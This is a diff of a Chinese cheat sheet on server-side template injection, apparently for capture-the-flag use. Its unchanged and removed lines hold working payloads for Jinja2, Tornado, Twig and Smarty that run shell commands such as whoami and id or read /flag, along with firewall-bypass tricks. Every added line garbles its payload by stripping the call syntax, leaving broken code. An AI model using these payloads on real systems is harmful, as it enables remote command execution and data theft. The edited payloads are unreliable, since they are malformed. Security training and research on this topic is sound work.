@@ -70,11 +70,11 @@ Jinja2 拥有强大的 Python 反射机制。如果我们可以直接或间接�
     我们可以通过遍历 `object.__subclasses__()` 查找引入了 `os` 模块的内置类（如 `sys` 或 `warnings`）。
     ```python
     # 通过查找 warnings.catch_warnings 类（通常在 subclasses 的前两百个内）
-    {{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('whoami').read() }}
+    {{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__'popen'.read() }}
     ```
 *   **利用 `__import__` 动态加载**：
     ```python
-    {{ [].__class__.__base__.__subclasses__()[0].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read() }}
+    {{ [].__class__.__base__.__subclasses__()[0].__init__.__globals__['__builtins__']'__import__'.popen('whoami').read() }}
     ```
 
 ### A.1 Jinja2 对象遍历定位脚本
@@ -104,7 +104,7 @@ Jinja2 拥有强大的 Python 反射机制。如果我们可以直接或间接�
 如果 `os` 不在 globals，改查 `__builtins__`：
 
 ```jinja
-{{ ''.__class__.__mro__[1].__subclasses__()[IDX].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
+{{ ''.__class__.__mro__[1].__subclasses__()[IDX].__init__.__globals__['__builtins__']'__import__'.popen('id').read() }}
 ```
 
 ### B. 绕过 WAF 过滤技巧
@@ -126,13 +126,13 @@ Jinja2 拥有强大的 Python 反射机制。如果我们可以直接或间接�
 *   **绕过引号 `'` / `"` 过滤**：
     *   利用 `request` 对象获取外部参数，将恶意字符串转移到 GET/POST/Cookie 字段中：
         ```jinja
-        {{ ''['__class__']['__mro__'][1].__subclasses__()[132].__init__.__globals__[request.args.cmd](request.args.arg).read() }}
+        {{ ''['__class__']['__mro__'][1].__subclasses__()[132].__init__.__globals__request.args.cmd.read() }}
         ```
         *请求时附加参数：`?cmd=popen&arg=cat+/flag`。*
     *   使用 `chr` 编码拼接：
         `{% set popen = (dict(p=1)|join~dict(o=1)|join~dict(p=1)|join~dict(e=1)|join~dict(n=1)|join) %}`
     *   利用内置 `lipsum` 或 `config` 关键字：
-        `{{ lipsum.__globals__['os']['popen']('whoami').read() }}`
+        `{{ lipsum.__globals__['os']'popen'.read() }}`
 
 ### C. 过滤器对照表
 
@@ -212,7 +212,7 @@ Java 模板引擎可以通过实例化 Java Runtime 类直接执行命令：
 # Tornado 模板引擎
 {{ __import__('os').popen('whoami').read() }}
 {{ handler.settings }}  # 泄露 tornado 配置 (含 cookie_secret)
-{{ globals()['__builtins__']['__import__']('os').popen('id').read() }}
+{{ globals()['__builtins__']'__import__'.popen('id').read() }}
 ```
 
 ### Smarty (PHP)
@@ -255,7 +255,7 @@ Java 模板引擎可以通过实例化 Java Runtime 类直接执行命令：
 
 | 引擎 | 读变量 | 读文件 | 执行/副作用 | 卡点 |
 |---|---|---|---|---|
-| Jinja2 | `{{config.items()}}` | `{{ lipsum.__globals__['open']('/flag').read() }}` | `os.popen()` | `SandboxedEnvironment` 拦属性 |
+| Jinja2 | `{{config.items()}}` | `{{ lipsum.__globals__'open'.read() }}` | `os.popen()` | `SandboxedEnvironment` 拦属性 |
 | Twig | `{{_self}}` | `{{'/flag'|file_excerpt(1,200)}}` | `{{['id']|filter('system')}}` | 新版本禁危险 filter |
 | Smarty | `{$smarty.version}` | `{include file='/flag'}` | `{system('id')}` | `{php}` 标签关闭 |
 | FreeMarker | `${.version}` | `${product.getClass()...openStream()}` | `Execute?new()` | `SAFER_RESOLVER` |
